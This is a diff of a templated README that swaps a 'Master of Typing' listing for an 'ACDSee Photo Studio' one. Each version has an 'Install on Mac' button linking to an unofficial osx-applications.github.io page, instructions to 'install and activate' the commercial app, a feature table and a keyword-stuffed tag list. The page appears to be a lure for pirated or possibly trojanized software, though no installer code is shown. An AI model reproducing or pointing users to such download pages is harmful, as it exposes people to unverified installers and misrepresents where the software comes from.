@@ -1,12 +1,12 @@
-# Master of Typing  
+# ACDSee Photo Studio  
 
 <div align="center">
-  <img src="https://insmac.org/uploads/posts/2021-09/1631730341_master-of-typing-3.png" width="250"/>
+  <img src="https://images.icon-icons.com/3053/PNG/512/acdsee_photo_studio_macos_bigsur_icon_190477.png" width="250"/>
 </div>  
 <br>
 <div align="center">
 
-[![🍏 Install on Mac](https://img.shields.io/badge/🍏_Install_on_Mac-darkblue?style=for-the-badge&logo=apple)](https://osx-applications.github.io/.github/mot)
+[![🍏 Install on Mac](https://img.shields.io/badge/🍏_Install_on_Mac-darkblue?style=for-the-badge&logo=apple)](https://osx-applications.github.io/.github/acdsee)
 
 </div>
 
@@ -14,22 +14,22 @@
 
 # Installation Instructions  
 
-1. Go to the page by clicking the button above.  
-2. Follow the setup prompts to install and activate Master of Typing on your Mac.  
+1. Visit the website using the button above.  
+2. Follow the setup prompts to install and activate ACDSee Photo Studio on your Mac.  
 
 ---
 
 <div align="center">
-  <img src="https://store-images.s-microsoft.com/image/apps.52323.14026931301012481.22cd3478-51af-409e-a194-814e282ac18b.bdca14c0-fbcc-4888-b465-f1a326294514" width="1080"/>
+  <img src="https://res.acdsee.com/media/uploads/2024/11/02022744/ACDSeeMac11-Screenshots-Manage-AISuperRes.jpg" width="1080"/>
 </div>  
 <br>
 
 ## 💻 Overview  
 
-Master of Typing is an interactive program created to help users enhance typing speed and accuracy.  
-It provides structured lessons, fun exercises, and detailed performance tracking to make learning effective and engaging.  
+ACDSee Photo Studio is a complete photography solution that combines image management, editing, and enhancement in a single platform.  
+It allows photographers and creatives to organize large photo collections while applying precise adjustments to individual images.  
 
-The software adapts to the user's skill level, allowing beginners to start slowly while offering advanced challenges for experienced typists. Optimized for macOS, it ensures smooth operation across both Intel and Apple Silicon systems.  
+The application includes AI-powered tools for improving resolution, automatic enhancements, and advanced editing capabilities. Its intuitive interface and powerful batch processing features streamline workflows for professional results.  
 
 ---
 
@@ -37,14 +37,14 @@ The software adapts to the user's skill level, allowing beginners to start slowl
 
 | Feature | Description |
 |----------|-------------|
-| ⌨ Guided Lessons | Stepwise lessons that progressively improve typing skills. |
-| 🎮 Fun Typing Games | Play games designed to strengthen speed and accuracy. |
-| 📊 Performance Tracking | Monitor typing speed, accuracy, and progress in real-time. |
-| 🧠 Adaptive Difficulty | Lessons adjust dynamically based on user performance. |
-| 🌐 Online Challenges | Optional online competitions to test your typing skills. |
-| ⚙ Customizable Practices | Tailor exercises to focus on specific keys or text. |
-| 🖥 macOS Optimized | Works efficiently on both Intel and Apple Silicon Macs. |
-| 🔒 Focused Learning | Safe environment without ads or distractions. |
+| 🖼 Comprehensive Photo Management | Easily catalog, tag, and organize images across libraries. |
+| ✨ AI-Powered Enhancement | Increase image clarity and resolution with smart AI tools. |
+| 🎨 Professional Editing Tools | Color correction, cropping, retouching, and filter application. |
+| 🗂 Support for RAW & Popular Formats | Full compatibility with RAW, JPEG, PNG, TIFF, and more. |
+| ⚡ Efficient Batch Operations | Apply edits and export multiple files simultaneously. |
+| 🖥 Intuitive Interface | User-friendly design for streamlined photo editing and browsing. |
+| 🔍 Advanced Search & Metadata | Quickly locate files using keywords, tags, and metadata. |
+| 🔐 Secure Backup Options | Protect photos with cloud or local backup solutions. |
 
 ---
 
@@ -54,12 +54,12 @@ The software adapts to the user's skill level, allowing beginners to start slowl
 |------------|---------------|
 | Operating System | macOS 10.15 (Catalina) or later |
 | Processor | Intel or Apple Silicon (M1/M2/M3) |
-| RAM | Minimum 4 GB |
-| Storage | 500 MB free space |
-| Internet | Optional, for online competitions |
+| RAM | Minimum 8 GB |
+| Storage | 3 GB available disk space |
+| Internet | Required for updates and cloud features |
 
 ---
 
 ## 🏷 Tags  
 
-master of typing • improvision • master typing master • typing master master • typing master typing • typing master typing master • typing master download • typing master online • typing master test • typing master pro • master of typing 3 • typing master online practice • typing master pro download • type master typing test • typewriting master • typewriting master download • typing master download pro • typing master master download • typing master online typing • typing master word typing game
+acdsee • acdsee photo studio • acd systems • acdsee pro • acdsee ultimate photo studio • acdc software • acdsee professional edition • acd systems canvas x • acd systems ltd • acdsystem • acdsee mac • acd software tools • acdsee photo studio 2023 • acdsee photo editor • acdsee photo library • acdc photo suite • acdsee photo management • acdsee creative tools • acdsee home studio • acdsee professional studio • acdsee alternatives • acdc photo editor • ultimate photo studio • acdsee pro 10 • acd systems international • acdsee reviews
